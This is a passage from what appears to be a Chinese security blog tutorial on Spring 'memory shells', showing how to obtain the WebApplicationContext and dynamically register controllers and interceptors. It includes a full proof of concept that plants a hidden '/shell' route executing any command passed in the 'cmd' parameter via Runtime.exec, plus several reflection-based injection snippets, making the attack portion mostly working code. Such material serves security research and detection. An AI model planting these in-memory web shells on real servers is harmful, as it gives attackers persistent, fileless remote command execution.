<code>ServletRequest</code> <em>类的实例来获得</em> <code>Child WebApplicationContext</code>。</p><h5 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute"></a><strong>getAttribute</strong></h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext</p><h4 id="动态注册Controller"><a href="#动态注册Controller" class="headerlink" title="动态注册Controller"></a>动态注册Controller</h4><p>Spring Controller 的动态注册，就是对 <code>RequestMappingHandlerMapping</code> 注入的过程。</p><p><code>RequestMappingHandlerMapping</code>是springMVC里面的核心Bean，spring把我们的controller解析成<code>RequestMappingInfo</code>对象，然后再注册进<code>RequestMappingHandlerMapping</code>中，这样请求进来以后就可以根据请求地址调用到Controller类里面了。</p><ul><li>RequestMappingHandlerMapping对象本身是spring来管理的，可以通过ApplicationContext取到，所以并不需要我们新建。</li><li>在SpringMVC框架下，会有两个ApplicationContext，一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的<code>org.springframework.web.context.ContextLoaderListener</code>，由它来完成IOC容器的初始化和bean对象的注入。</li><li>另外一个是ApplicationContext是由<code>org.springframework.web.servlet.DispatcherServlet</code>完成的，具体是在<code>org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()</code>这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。</li></ul><p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br><code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>映射器 ；</p><p>Spring 3.1 开始及以后一般开始使用新的<br><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code><br>映射器来支持@Contoller和@RequestMapping注解。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-56.png" alt="img43"></p><h5 id="registerMapping"><a href="#registerMapping" class="headerlink" title="registerMapping"></a>registerMapping</h5><p>在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span><br><span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/hahaha&quot;</span>);<br><span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br><span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><span class="hljs-comment">// 5. 在内存中动态注册 controller</span><br><span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>r.registerMapping(info, Class.forName(<span class="hljs-string">&quot;恶意Controller&quot;</span>).newInstance(), method);<br></code></pre></td></tr></table></figure><h5 id="registerHandler"><a href="#registerHandler" class="headerlink" title="registerHandler"></a>registerHandler</h5><p>参考上面的 <code>HandlerMapping</code> 接口继承关系图，针对使用 <code>DefaultAnnotationHandlerMapping</code> 映射器的应用，可以找到它继承的顶层类<code>org.springframework.web.servlet.handler.AbstractUrlHandlerMapping</code></p><p>在其<code>registerHandler()</code>方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerHandler</span><span class="hljs-params">(String urlPath, Object handler)</span> <span class="hljs-keyword">throws</span> BeansException, IllegalStateException &#123;<br>Assert.notNull(urlPath, <span class="hljs-string">&quot;URL path must not be null&quot;</span>);<br>Assert.notNull(handler, <span class="hljs-string">&quot;Handler object must not be null&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">resolvedHandler</span> <span class="hljs-operator">=</span> handler;<br><br><span class="hljs-comment">// Eagerly resolve handler if referencing singleton via name.</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.lazyInitHandlers &amp;&amp; handler <span class="hljs-keyword">instanceof</span> String) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">handlerName</span> <span class="hljs-operator">=</span> (String) handler;<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> obtainApplicationContext();<br><span class="hljs-keyword">if</span> (applicationContext.isSingleton(handlerName)) &#123;<br>resolvedHandler = applicationContext.getBean(handlerName);<br>&#125;<br>&#125;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.handlerMap.get(urlPath);<br><span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (mappedHandler != resolvedHandler) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br><span class="hljs-string">&quot;Cannot map &quot;</span> + getHandlerDescription(handler) + <span class="hljs-string">&quot; to URL path [&quot;</span> + urlPath +<br><span class="hljs-string">&quot;]: There is already &quot;</span> + getHandlerDescription(mappedHandler) + <span class="hljs-string">&quot; mapped.&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (urlPath.equals(<span class="hljs-string">&quot;/&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(<span class="hljs-string">&quot;Root mapping to &quot;</span> + getHandlerDescription(handler));<br>&#125;<br>setRootHandler(resolvedHandler);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (urlPath.equals(<span class="hljs-string">&quot;/*&quot;</span>)) &#123;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(<span class="hljs-string">&quot;Default mapping to &quot;</span> + getHandlerDescription(handler));<br>&#125;<br>setDefaultHandler(resolvedHandler);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">this</span>.handlerMap.put(urlPath, resolvedHandler);<br><span class="hljs-keyword">if</span> (getPatternParser() != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.pathPatternHandlerMap.put(getPatternParser().parse(urlPath), resolvedHandler);<br>&#125;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(<span class="hljs-string">&quot;Mapped [&quot;</span> + urlPath + <span class="hljs-string">&quot;] onto &quot;</span> + getHandlerDescription(handler));<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法接受 <code>urlPath</code>参数和 <code>handler</code>参数，可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 将 url 和 controller 实例 bean 注册到 <code>handlerMap</code> 中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 在当前上下文环境中注册一个名为 dynamicController 的 Webshell controller 实例 bean</span><br>context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).newInstance());<br><span class="hljs-comment">// 2. 从当前上下文环境中获得 DefaultAnnotationHandlerMapping 的实例 bean</span><br>org.springframework.web.servlet.mvc.annotation.<span class="hljs-type">DefaultAnnotationHandlerMapping</span>  <span class="hljs-variable">dh</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);<br><span class="hljs-comment">// 3. 反射获得 registerHandler Method</span><br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;registerHandler&quot;</span>, String.class, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 4. 将 dynamicController 和 URL 注册到 handlerMap 中</span><br>m1.invoke(dh, <span class="hljs-string">&quot;/favicon&quot;</span>, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure><h5 id="detectHandlerMethods"><a href="#detectHandlerMethods" class="headerlink" title="detectHandlerMethods"></a>detectHandlerMethods</h5><p>参考上面的 <code>HandlerMapping</code> 接口继承关系图，针对使用 <code>RequestMappingHandlerMapping</code> 映射器的应用，可以找到它继承的顶层类<code>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping</code></p><p>在其<code>detectHandlerMethods()</code> 方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">detectHandlerMethods</span><span class="hljs-params">(Object handler)</span> &#123;<br>    Class&lt;?&gt; handlerType = handler <span class="hljs-keyword">instanceof</span> String ? <span class="hljs-built_in">this</span>.getApplicationContext().getType((String)handler) : handler.getClass();<br>    <span class="hljs-keyword">final</span> Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);<br>    Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodFilter</span>() &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">matches</span><span class="hljs-params">(Method method)</span> &#123;<br>            <span class="hljs-keyword">return</span> AbstractHandlerMethodMapping.<span class="hljs-built_in">this</span>.getMappingForMethod(method, userType) != <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;);<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> methods.iterator();<br>    <span class="hljs-keyword">while</span>(var6.hasNext()) &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> (Method)var6.next();<br>        <span class="hljs-type">T</span> <span class="hljs-variable">mapping</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getMappingForMethod(method, userType);<br>        <span class="hljs-built_in">this</span>.registerHandlerMethod(handler, method, mapping);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法仅接受<code>handler</code>参数，同样可以在 <code>this.getApplicationContext()</code> 获得的上下文环境中寻找名字为 <code>handler</code> 参数值的 <code>bean</code>, 并注册 <code>controller</code> 的实例 <code>bean</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">context.getBeanFactory().registerSingleton(<span class="hljs-string">&quot;dynamicController&quot;</span>, Class.forName(<span class="hljs-string">&quot;恶意Controller&quot;</span>).newInstance());<br>org.springframework.web.servlet.mvc.method.annotation.<span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">requestMappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);<br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="hljs-string">&quot;detectHandlerMethods&quot;</span>, Object.class);<br>m1.setAccessible(<span class="hljs-literal">true</span>);<br>m1.invoke(requestMappingHandlerMapping, <span class="hljs-string">&quot;dynamicController&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="实现恶意Controller"><a href="#实现恶意Controller" class="headerlink" title="实现恶意Controller"></a>实现恶意Controller</h4><p>这里由于我们时动态注册Controller，所以我们只需要实现对应的恶意方法即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Controller_Shell</span><span class="hljs-params">()</span>&#123;&#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br> <br>            <span class="hljs-comment">//获取request</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="完整POC-4"><a href="#完整POC-4" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_controller</span> &#123;<br> <br><span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/control&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Spring_Controller</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;<br> <br>        <span class="hljs-comment">//获取当前上下文环境</span><br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br> <br>        <span class="hljs-comment">//手动注册Controller</span><br>        <span class="hljs-comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="hljs-string">&quot;shell&quot;</span>);<br>        <span class="hljs-comment">// 3. 定义访问 controller 的 URL 地址</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. 在内存中动态注册 controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        r.registerMapping(info, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Controller_Shell</span>(), method);<br> <br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller_Shell</span>&#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Controller_Shell</span><span class="hljs-params">()</span>&#123;&#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br> <br>            <span class="hljs-comment">//获取request</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>            Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));<br>        &#125;<br>    &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p>首先访问<code>/control</code>路由，由于Controller默认会将结果交给View处理，返回值通常会被解析成一个页面路径，所以这里会报404错误。我们可以使用<code>@ResponeBody</code>来将Controller的方法返回的对象，通过适当的HttpMessageConverter转换为指定格式后，写入到Response对象的body数据区。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-62.png" alt="img44"></p><p>然后访问我们定义恶意Controller的路由<code>/shell</code></p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-63.png" alt="img45"></p><h3 id="Interceptor型内存马"><a href="#Interceptor型内存马" class="headerlink" title="Interceptor型内存马"></a>Interceptor型内存马</h3><h4 id="什么是Interceptor"><a href="#什么是Interceptor" class="headerlink" title="什么是Interceptor"></a>什么是Interceptor</h4><p>Spring MVC 的拦截器（Interceptor）与 Java Servlet 的过滤器（Filter）类似，它主要用于拦截用户的请求并做相应的处理，通常应用在权限验证、记录请求信息的日志、判断用户是否登录等功能上。</p><p>在 Spring MVC 框架中定义一个拦截器需要对拦截器进行定义和配置，主要有以下 2 种方式。</p><ul><li>通过实现 HandlerInterceptor 接口或继承 HandlerInterceptor 接口的实现类（例如 HandlerInterceptorAdapter）来定义</li><li>通过实现 WebRequestInterceptor 接口或继承 WebRequestInterceptor 接口的实现类来定义</li></ul><h4 id="Interceptor示例"><a href="#Interceptor示例" class="headerlink" title="Interceptor示例"></a>Interceptor示例</h4><p>这里我们选择继承HandlerInterceptor接口来实现一个Interceptor。HandlerInterceptor接口有三个方法，如下</p><ul><li>preHandle：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回 true 表示继续向下执行，返回 false 表示中断后续操作。</li><li>postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。</li><li>afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br> <br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring_Interceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>        <span class="hljs-comment">//如果请求路径为/login则放行</span><br>        <span class="hljs-keyword">if</span> ( url.indexOf(<span class="hljs-string">&quot;/login&quot;</span>) &gt;= <span class="hljs-number">0</span>)&#123;<br>            writer.write(<span class="hljs-string">&quot;LoginIn&quot;</span>);<br>            writer.flush();<br>            writer.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        writer.write(<span class="hljs-string">&quot;LoginInFirst&quot;</span>);<br>        writer.flush();<br>        writer.close();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在springmvc.xml配置文件中配置相应的Interceptor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>&lt;mvc:interceptors&gt;<br>        &lt;mvc:interceptor&gt;<br>            &lt;mvc:mapping path=<span class="hljs-string">&quot;/*&quot;</span>/&gt;<br>            &lt;bean class=<span class="hljs-string">&quot;com.shell.interceptor.Spring_Interceptor&quot;</span>/&gt;<br>        &lt;/mvc:interceptor&gt;<br>&lt;/mvc:interceptors&gt;<br>...<br></code></pre></td></tr></table></figure><p>编写对应的Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br> <br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring_Controller</span> &#123;<br> <br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/login&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">Login</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Success!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问对应路径</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-64.png" alt="img46"></p><h4 id="request调用流程"><a href="#request调用流程" class="headerlink" title="request调用流程"></a>request调用流程</h4><p>我们首先来探究一下，当一个Request发送到Spring应用时，是如何一步步到达业务逻辑处理层Controller的。</p><p>在ApplicationFilterChain#internalDoFilter处下一个断点，可以看到此时的调用栈是和启动Tomcat时相同的</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-53.png" alt="img47"></p><p>但与Tomcat不同的是，当调用到<code>HttpServlet#service</code>时，最终会调用<code>DispatcherServlet#doDispatch</code>进行逻辑处理，这正是Spring的逻辑处理核心类。</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-54.png" alt="img48"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">doDispatch:<span class="hljs-number">1028</span>, DispatcherServlet (org.springframework.web.servlet)<br>doService:<span class="hljs-number">963</span>, DispatcherServlet (org.springframework.web.servlet)<br>processRequest:<span class="hljs-number">1006</span>, FrameworkServlet 